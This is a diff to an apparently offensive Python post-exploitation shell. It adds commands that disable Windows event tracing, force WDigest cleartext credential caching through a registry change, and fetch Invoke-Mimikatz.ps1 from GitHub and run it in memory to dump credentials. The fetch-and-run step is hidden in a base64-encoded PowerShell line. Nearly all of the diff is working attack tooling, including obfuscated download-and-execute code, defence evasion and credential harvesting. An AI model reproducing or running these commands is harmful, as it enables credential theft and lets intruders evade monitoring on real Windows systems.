@@ -29,7 +29,10 @@ def postExpHelp():
     print("   Steal-wifi:\tGrabs all saved wireless credentials".expandtabs(40))
     print("   Basic-enum:\tBasic enumeration on the system".expandtabs(40))
     print("   Schedtasks:\tGrabs scheduled tasks on the system".expandtabs(40))
+    print("   killETW:\tAttempts to disable Event Tracing by setting COMPlus_ETWEnabled environment var to 0".expandtabs(40))
+    print("   Wdigest-downgrade:\tAddes reg entry to force Wdigest credential caching. Wait for a new login then dump LSASS for cleartext creds".expandtabs(40))
     print("   Elevated:\tChecks for the AlwaysInstalledElevated reg key for priv-esc".expandtabs(40))
+    print("   Mimikatz:\tGrabs Invoke-Mimikatz.ps1 (PowerSploit) from Github and executes it in memory".expandtabs(40))
     print("   Killproc:\tKills a process by PID(TODO)".expandtabs(40))
     print("   Sysmon-kill:\tStops sysmon(TODO)".expandtabs(40))
     print("   Byod:\tAttempts to elevate to SYSTEM by using the BYOD (Bring-your-own-driver) method(TODO)".expandtabs(40))
@@ -63,6 +66,21 @@ def postExpShell():
 
         elif user_input.lower() == "elevated":
             return "powershell.exe -c 'reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated'"
+
+        elif user_input.lower() == "killetw":
+            return "COMPlus_ETWEnabled = 0"
+
+        elif user_input.lower() == "wdigest-downgrade":
+            return "reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1"
+
+        elif user_input.lower() == "mimikatz":
+            print("Communication is currently not encrypted (this is coming soon). Anybody with your alert and auth tokens can see the result of this command.")
+            choice = input("Do you want to continue  (y/n): ")
+            if choice.lower() == "y" or choice.lower() == "yes":
+                return "powershell.exe -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AUABvAHcAZQByAFMAaABlAGwAbABNAGEAZgBpAGEALwBQAG8AdwBlAHIAUwBwAGwAbwBpAHQALwBmADYANQAwADUAMgAwAGMANABiADEAMAAwADQAZABhAGYAOABiADMAZQBjADAAOAAwADAANwBhADAAYgA5ADQANQBiADkAMQAyADUAMwBhAC8ARQB4AGYAaQBsAHQAcgBhAHQAaQBvAG4ALwBJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAuAHAAcwAxACcAKQA7ACAASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoAIAAtAEQAdQBtAHAAQwByAGUAZABzAA=="
+
+            else:
+                return "echo smart choice :)"
 
         else:
             print(Fore.RED + "[-]" + Fore.RESET + " Unknown command: " + user_input)
